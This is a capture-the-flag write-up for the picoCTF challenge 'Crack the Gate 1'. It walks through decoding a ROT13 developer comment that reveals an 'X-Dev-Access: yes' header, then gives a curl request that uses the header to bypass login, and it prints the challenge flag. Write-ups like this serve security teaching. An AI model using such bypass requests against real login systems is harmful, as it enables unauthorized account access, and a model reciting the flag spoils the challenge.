# Crack the Gate 1

**Platform:** CyLab Security Academy (picoCTF), picoMini by CMU-Africa
**Category:** Web Exploitation
**Difficulty:** Easy
**Flag:** `picoCTF{brut4_f0rc4_0d39383f}`

## Summary

A login portal built with Express.js ships a leftover developer note in the page HTML, encoded
with ROT13 to keep it from being immediately obvious on a casual view-source. Decoded, the note
reveals an authentication bypass header that a developer left in for debugging and never removed.
Sending that header on the login request skips password verification entirely for the known
account email.

## Discovery

Fetching the login page and reading the raw HTML (not the rendered page) shows an HTML comment
sitting just above the login form:

```html
<!-- ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf" -->
<!-- Remove before pushing to production! -->
```

The second comment is a plain giveaway that the first one matters. Running the first through
ROT13:

```
ABGR: Wnpx - grzcbenel olcnff: hfr urnqre "K-Qri-Npprff: lrf"
NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes"
```

The client-side JS also shows the login form posts JSON to `/login` and expects a `success`
field plus a `flag` field in the response.

## Proof of Concept

```
curl -s -X POST http://TARGET/login \
  -H "Content-Type: application/json" \
  -H "X-Dev-Access: yes" \
  -d '{"email":"ctf-player@picoctf.org","password":"anything"}'
```

Response:

```json
{"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{brut4_f0rc4_0d39383f}"}
```

The password value is never checked once the `X-Dev-Access: yes` header is present; any string
works.

## Root Cause

A debug/QA bypass header was hardcoded into the authentication logic during development and
never gated behind an environment check or removed before deployment. The developer's own
comment documents the exact header and value, only lightly obscured with ROT13, so the fix
requires no guessing once the HTML source is read.

## CWE / OWASP

- **CWE-489**: Active Debug Code
- **CWE-798**: Use of Hard-coded Credentials
- **OWASP A07:2021**: Identification and Authentication Failures
